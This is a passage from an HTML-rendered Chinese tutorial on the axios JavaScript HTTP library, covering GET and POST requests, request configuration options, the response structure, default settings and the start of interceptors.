class=\"hljs-string\">&#x27;/user&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">params</span>:&#123;<br>        <span class=\"hljs-attr\">ID</span>:<span class=\"hljs-number\">12345</span><br>    &#125;<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;成功！&quot;</span>)<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;失败&quot;</span>);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;总是执行的部分&quot;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"POST请求\"><a href=\"#POST请求\" class=\"headerlink\" title=\"POST请求\"></a>POST请求</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/user&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">fiestName</span>:<span class=\"hljs-string\">&#x27;Fred&#x27;</span>,<br>    <span class=\"hljs-attr\">lastName</span>:<span class=\"hljs-string\">&#x27;Smith&#x27;</span><br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(response);<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(err);<br>&#125;);<br><br><span class=\"hljs-comment\">//多个POST请求</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getUserAccount</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getUserPermissions</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345/permissions&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([<span class=\"hljs-title function_\">getUserAccount</span>(),<span class=\"hljs-title function_\">getUserPermissions</span>()]).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">results</span>)&#123;<br>    <span class=\"hljs-keyword\">const</span> acct=results[<span class=\"hljs-number\">0</span>];<br>    <span class=\"hljs-keyword\">const</span> perm=results[<span class=\"hljs-number\">1</span>];<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-Axops-API\"><a href=\"#3-Axops-API\" class=\"headerlink\" title=\"3.Axops API\"></a>3.Axops API</h4><p>可以向 <code>axios</code> 传递相关配置来创建请求</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//发起一个post请求</span><br><span class=\"hljs-title function_\">axios</span>(&#123;<br>\t<span class=\"hljs-attr\">method</span>:<span class=\"hljs-string\">&#x27;post&#x27;</span>,<br>    <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>,<br>    <span class=\"hljs-attr\">data</span>:&#123;<br>        <span class=\"hljs-attr\">firstname</span>:<span class=\"hljs-string\">&#x27;Martin&#x27;</span>,<br>        <span class=\"hljs-attr\">lastname</span>:<span class=\"hljs-string\">&#x27;Smith&#x27;</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//在nodeJS用GET请求远程图片</span><br><span class=\"hljs-title function_\">axios</span>(&#123;<br>    <span class=\"hljs-attr\">method</span>:<span class=\"hljs-string\">&#x27;get&#x27;</span>,<br>    <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;http://test/123&#x27;</span>,<br>    <span class=\"hljs-attr\">responseType</span>:<span class=\"hljs-string\">&#x27;stream&#x27;</span><br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">response</span>)=&gt;</span>&#123;<br>    response.<span class=\"hljs-property\">data</span>.<span class=\"hljs-title function_\">pipe</span>(fs.<span class=\"hljs-title function_\">createWriteStream</span>(<span class=\"hljs-string\">&#x27;test.jpg&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-请求配置\"><a href=\"#4-请求配置\" class=\"headerlink\" title=\"4.请求配置\"></a>4.请求配置</h4><p>创建请求时可以用配置选项；只有url是必须的，如果没有指定method，则默认使用GET；</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-punctuation\">&#123;</span><br>    url<span class=\"hljs-punctuation\">:</span>&#x27;/api/user&#x27;<span class=\"hljs-punctuation\">,</span>          <span class=\"hljs-comment\">//用于请求的服务器URL</span><br>    method<span class=\"hljs-punctuation\">:</span>&#x27;get&#x27;<span class=\"hljs-punctuation\">,</span><br>    baseUrl<span class=\"hljs-punctuation\">:</span>&#x27;https<span class=\"hljs-punctuation\">:</span><span class=\"hljs-comment\">//192.168.0.1:35000&#x27;,\t\t//自动加在url前；</span><br>    transformRequest<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">[</span><br>        function(data<span class=\"hljs-punctuation\">,</span>headers)<span class=\"hljs-punctuation\">&#123;</span><br>            <span class=\"hljs-comment\">//对即将发送的data进行处理；</span><br>            return processedData;<br>        <span class=\"hljs-punctuation\">&#125;</span><br>    <span class=\"hljs-punctuation\">]</span><span class=\"hljs-punctuation\">,</span><br>    transformResponse<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">[</span><br>        function(response)<span class=\"hljs-punctuation\">&#123;</span><br>            <span class=\"hljs-comment\">//对收到的响应进行处理；</span><br>            return processedResponse;<br>        <span class=\"hljs-punctuation\">&#125;</span><br>    <span class=\"hljs-punctuation\">]</span><span class=\"hljs-punctuation\">,</span><br>    headers<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span>&#x27;X-Requested-With&#x27;<span class=\"hljs-punctuation\">:</span> &#x27;XMLHttpRequest&#x27;<span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    params<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><br>        ID<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">12345</span>\t\t<span class=\"hljs-comment\">//与请求一起发送的url参数；</span><br>    <span class=\"hljs-punctuation\">&#125;</span>，<br>    <span class=\"hljs-comment\">//data是作为请求体被发送的数据，仅适用于PUT，POST，DELETE和PATCH方法；</span><br>    <span class=\"hljs-comment\">// 在没有设置 `transformRequest` 时，则必须是以下类型之一:</span><br>  \t<span class=\"hljs-comment\">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span><br>  \t<span class=\"hljs-comment\">// - 浏览器专属: FormData, File, Blob</span><br>  \t<span class=\"hljs-comment\">// - Node 专属: Stream, Buffer</span><br>    data<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><br>    firstname<span class=\"hljs-punctuation\">:</span>&#x27;Fred&#x27;<span class=\"hljs-punctuation\">,</span><br>\t<span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>      <span class=\"hljs-comment\">// 发送请求体数据的可选语法</span><br>      <span class=\"hljs-comment\">// 请求方式 post</span><br>      <span class=\"hljs-comment\">// 只有 value 会被发送，key 则不会</span><br>      data<span class=\"hljs-punctuation\">:</span> &#x27;Country=Brasil&amp;City=Belo Horizonte&#x27;<span class=\"hljs-punctuation\">,</span><br><br>\t<span class=\"hljs-comment\">//timeout:指定请求超时的毫秒数；默认0ms；</span><br>\ttimeout<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1000</span><span class=\"hljs-punctuation\">,</span>  <br>\t<br>\t<span class=\"hljs-comment\">//跨域时是否需要凭证；</span><br>\twithCredentials<span class=\"hljs-punctuation\">:</span><span class=\"hljs-literal\"><span class=\"hljs-keyword\">false</span></span><span class=\"hljs-punctuation\">,</span><br>  <span class=\"hljs-comment\">// `adapter` 允许自定义处理请求，这使测试更加容易。</span><br>  <span class=\"hljs-comment\">// 返回一个 promise 并提供一个有效的响应 （参见 lib/adapters/README.md）。</span><br>  adapter<span class=\"hljs-punctuation\">:</span> function (config) <span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-comment\">/* ... */</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `auth` HTTP Basic Auth</span><br>  auth<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>    username<span class=\"hljs-punctuation\">:</span> &#x27;janedoe&#x27;<span class=\"hljs-punctuation\">,</span><br>    password<span class=\"hljs-punctuation\">:</span> &#x27;s00pers3cret&#x27;<br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `responseType` 表示浏览器将要响应的数据类型</span><br>  <span class=\"hljs-comment\">// 选项包括: &#x27;arraybuffer&#x27;, &#x27;document&#x27;, &#x27;json&#x27;, &#x27;text&#x27;, &#x27;stream&#x27;</span><br>  <span class=\"hljs-comment\">// 浏览器专属：&#x27;blob&#x27;</span><br>  responseType<span class=\"hljs-punctuation\">:</span> &#x27;json&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `responseEncoding` 表示用于解码响应的编码 (Node.js 专属)</span><br>  <span class=\"hljs-comment\">// 注意：忽略 `responseType` 的值为 &#x27;stream&#x27;，或者是客户端请求</span><br>  <span class=\"hljs-comment\">// Note: Ignored for `responseType` of &#x27;stream&#x27; or client-side requests</span><br>  responseEncoding<span class=\"hljs-punctuation\">:</span> &#x27;utf8&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `xsrfCookieName` 是 xsrf token 的值，被用作 cookie 的名称</span><br>  xsrfCookieName<span class=\"hljs-punctuation\">:</span> &#x27;XSRF-TOKEN&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `xsrfHeaderName` 是带有 xsrf token 值的http 请求头名称</span><br>  xsrfHeaderName<span class=\"hljs-punctuation\">:</span> &#x27;X-XSRF-TOKEN&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `onUploadProgress` 允许为上传处理进度事件</span><br>  <span class=\"hljs-comment\">// 浏览器专属</span><br>  onUploadProgress<span class=\"hljs-punctuation\">:</span> function (progressEvent) <span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-comment\">// 处理原生进度事件</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `onDownloadProgress` 允许为下载处理进度事件</span><br>  <span class=\"hljs-comment\">// 浏览器专属</span><br>  onDownloadProgress<span class=\"hljs-punctuation\">:</span> function (progressEvent) <span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-comment\">// 处理原生进度事件</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `maxContentLength` 定义了node.js中允许的HTTP响应内容的最大字节数</span><br>  maxContentLength<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">2000</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `maxBodyLength`（仅Node）定义允许的http请求内容的最大字节数</span><br>  maxBodyLength<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">2000</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `validateStatus` 定义了对于给定的 HTTP状态码是 resolve 还是 reject promise。</span><br>  <span class=\"hljs-comment\">// 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，</span><br>  <span class=\"hljs-comment\">// 则promise 将会 resolved，否则是 rejected。</span><br>  validateStatus<span class=\"hljs-punctuation\">:</span> function (status) <span class=\"hljs-punctuation\">&#123;</span><br>    return status &gt;= <span class=\"hljs-number\">200</span> &amp;&amp; status &lt; <span class=\"hljs-number\">300</span>; <span class=\"hljs-comment\">// 默认值</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `maxRedirects` 定义了在node.js中要遵循的最大重定向数。</span><br>  <span class=\"hljs-comment\">// 如果设置为0，则不会进行重定向</span><br>  maxRedirects<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">5</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `socketPath` 定义了在node.js中使用的UNIX套接字。</span><br>  <span class=\"hljs-comment\">// e.g. &#x27;/var/run/docker.sock&#x27; 发送请求到 docker 守护进程。</span><br>  <span class=\"hljs-comment\">// 只能指定 `socketPath` 或 `proxy` 。</span><br>  <span class=\"hljs-comment\">// 若都指定，这使用 `socketPath` 。</span><br>  socketPath<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">null</span></span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// default</span><br><br>  <span class=\"hljs-comment\">// `httpAgent` and `httpsAgent` define a custom agent to be used when performing http</span><br>  <span class=\"hljs-comment\">// and https requests, respectively, in node.js. This allows options to be added like</span><br>  <span class=\"hljs-comment\">// `keepAlive` that are not enabled by default.</span><br>  httpAgent<span class=\"hljs-punctuation\">:</span> new http.Agent(<span class=\"hljs-punctuation\">&#123;</span> keepAlive<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">true</span></span> <span class=\"hljs-punctuation\">&#125;</span>)<span class=\"hljs-punctuation\">,</span><br>  httpsAgent<span class=\"hljs-punctuation\">:</span> new https.Agent(<span class=\"hljs-punctuation\">&#123;</span> keepAlive<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">true</span></span> <span class=\"hljs-punctuation\">&#125;</span>)<span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `proxy` 定义了代理服务器的主机名，端口和协议。</span><br>  <span class=\"hljs-comment\">// 您可以使用常规的`http_proxy` 和 `https_proxy` 环境变量。</span><br>  <span class=\"hljs-comment\">// 使用 `false` 可以禁用代理功能，同时环境变量也会被忽略。</span><br>  <span class=\"hljs-comment\">// `auth`表示应使用HTTP Basic auth连接到代理，并且提供凭据。</span><br>  <span class=\"hljs-comment\">// 这将设置一个 `Proxy-Authorization` 请求头，它会覆盖 `headers` 中已存在的自定义 `Proxy-Authorization` 请求头。</span><br>  <span class=\"hljs-comment\">// 如果代理服务器使用 HTTPS，则必须设置 protocol 为`https`</span><br>  proxy<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>    protocol<span class=\"hljs-punctuation\">:</span> &#x27;https&#x27;<span class=\"hljs-punctuation\">,</span><br>    host<span class=\"hljs-punctuation\">:</span> &#x27;<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>&#x27;<span class=\"hljs-punctuation\">,</span><br>    port<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">9000</span><span class=\"hljs-punctuation\">,</span><br>    auth<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>      username<span class=\"hljs-punctuation\">:</span> &#x27;mikeymike&#x27;<span class=\"hljs-punctuation\">,</span><br>      password<span class=\"hljs-punctuation\">:</span> &#x27;rapunz3l&#x27;<br>    <span class=\"hljs-punctuation\">&#125;</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// see https://axios-http.com/zh/docs/cancellation</span><br>  cancelToken<span class=\"hljs-punctuation\">:</span> new CancelToken(function (cancel) <span class=\"hljs-punctuation\">&#123;</span><br>  <span class=\"hljs-punctuation\">&#125;</span>)<span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `decompress` indicates whether or not the response body should be decompressed </span><br>  <span class=\"hljs-comment\">// automatically. If set to `true` will also remove the &#x27;content-encoding&#x27; header </span><br>  <span class=\"hljs-comment\">// from the responses objects of all decompressed responses</span><br>  <span class=\"hljs-comment\">// - Node only (XHR cannot turn off decompression)</span><br>  decompress<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">true</span></span> <span class=\"hljs-comment\">// 默认值</span><br><span class=\"hljs-punctuation\">&#125;</span><br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"5-响应结构\"><a href=\"#5-响应结构\" class=\"headerlink\" title=\"5.响应结构\"></a>5.响应结构</h4><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-punctuation\">&#123;</span><br>\t<span class=\"hljs-comment\">//data为服务器响应</span><br>    data<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    <br>    <span class=\"hljs-comment\">//状态码</span><br>    status<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">200</span><span class=\"hljs-punctuation\">,</span><br>    <br>    <span class=\"hljs-comment\">//HTTP状态信息</span><br>    statusText<span class=\"hljs-punctuation\">:</span>&#x27;OK&#x27;<span class=\"hljs-punctuation\">,</span><br>    <br>    <span class=\"hljs-comment\">//服务器响应头</span><br>    headers<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    <span class=\"hljs-comment\">//axios请求的配置信息；</span><br>    config<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    <span class=\"hljs-comment\">//生成响应的请求</span><br>    <span class=\"hljs-comment\">// 在node.js中它是最后一个ClientRequest实例 (in redirects)，</span><br>  \t<span class=\"hljs-comment\">// 在浏览器中则是 XMLHttpRequest 实例</span><br>    request<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><span class=\"hljs-punctuation\">&#125;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"三、默认配置\"><a href=\"#三、默认配置\" class=\"headerlink\" title=\"三、默认配置\"></a>三、默认配置</h3><h4 id=\"1-全局axios默认值\"><a href=\"#1-全局axios默认值\" class=\"headerlink\" title=\"1.全局axios默认值\"></a>1.全局axios默认值</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">baseURL</span> = <span class=\"hljs-string\">&#x27;https://api.example.com&#x27;</span>;<br>axios.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">headers</span>.<span class=\"hljs-property\">common</span>[<span class=\"hljs-string\">&#x27;Authorization&#x27;</span>] = <span class=\"hljs-variable constant_\">AUTH_TOKEN</span>;<br>axios.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">headers</span>.<span class=\"hljs-property\">post</span>[<span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>] = <span class=\"hljs-string\">&#x27;application/x-www-form-urlencoded&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-自定义实例默认值\"><a href=\"#2-自定义实例默认值\" class=\"headerlink\" title=\"2.自定义实例默认值\"></a>2.自定义实例默认值</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 创建实例时配置默认值</span><br><span class=\"hljs-keyword\">const</span> instance = axios.<span class=\"hljs-title function_\">create</span>(&#123;<br>  <span class=\"hljs-attr\">baseURL</span>: <span class=\"hljs-string\">&#x27;https://api.example.com&#x27;</span><br>&#125;);<br><br><span class=\"hljs-comment\">// 创建实例后修改默认值</span><br>instance.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">headers</span>.<span class=\"hljs-property\">common</span>[<span class=\"hljs-string\">&#x27;Authorization&#x27;</span>] = <span class=\"hljs-variable constant_\">AUTH_TOKEN</span>;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-配置的优先级\"><a href=\"#3-配置的优先级\" class=\"headerlink\" title=\"3.配置的优先级\"></a>3.配置的优先级</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//此时默认超时时间为0</span><br><span class=\"hljs-keyword\">const</span> instance=axios.<span class=\"hljs-title function_\">create</span>();<br><br><span class=\"hljs-comment\">//重写库的超时默认值</span><br>instance.<span class=\"hljs-property\">defaults</span>,timeout=<span class=\"hljs-number\">2500</span>;<br><br><span class=\"hljs-comment\">//重写超时时间</span><br>instance.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/logout&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">timeout</span>:<span class=\"hljs-number\">5000</span><br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-拦截器\"><a href=\"#4-拦截器\" class=\"headerlink\" title=\"4.拦截器\"></a>4.拦截器</h4><p>请求或者响应被then或者catch处理之前拦截</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//添加请求拦截器</span><br>axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">user</span>(<span 